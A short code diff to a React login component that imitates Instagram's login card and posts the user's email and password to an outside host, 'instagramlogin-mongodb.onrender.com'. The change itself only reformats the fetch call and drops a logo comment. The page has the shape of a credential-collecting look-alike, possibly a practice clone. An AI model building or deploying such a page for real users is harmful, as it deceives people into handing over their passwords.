@@ -8,11 +8,14 @@ function App() {
 
   const handleLogin = async (e) => {
     e.preventDefault();
-    const response = await fetch('https://instagramlogin-mongodb.onrender.com/api/auth/login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ email, password }),
-    });
+    const response = await fetch(
+      'https://instagramlogin-mongodb.onrender.com/api/auth/login',
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password }),
+      },
+    );
 
     const data = await response.json();
 
@@ -26,7 +29,7 @@ function App() {
   return (
     <div className="flex items-center justify-center min-h-screen bg-gray-50">
       <div className="p-8 text-center bg-white border rounded-lg shadow-lg w-96">
-        {/* Instagram Logo */}
+      
         <div className="flex justify-center mb-6">
           <img
             src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
